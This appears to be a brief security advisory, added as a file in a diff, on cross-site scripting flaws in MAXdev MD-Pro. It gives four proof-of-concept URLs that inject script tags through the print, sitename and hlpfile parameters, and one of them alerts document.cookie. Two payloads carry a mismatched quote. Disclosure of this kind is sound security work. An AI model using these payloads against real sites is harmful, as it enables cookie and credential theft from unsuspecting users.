@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/14751/info
+
+MAXdev MD-Pro is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker may leverage any of these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example.com/modules.php?op=modload&name=subjects&file=print&print=<script>alert('LOL')</script>
+http://www.example.com/modules.php?op=modload&name=Messages&file=bb_smilies&sitename=</title><script>alert(LOL')</script>
+http://www.example.com/modules.php?op=modload&name=Messages&file=bbcode_ref&sitename=</title><script>alert(LOL')</script>
+http://www.example.com/javascript/openwindow.php?hlpfile=")<html><script>alert(document.cookie)</script> 
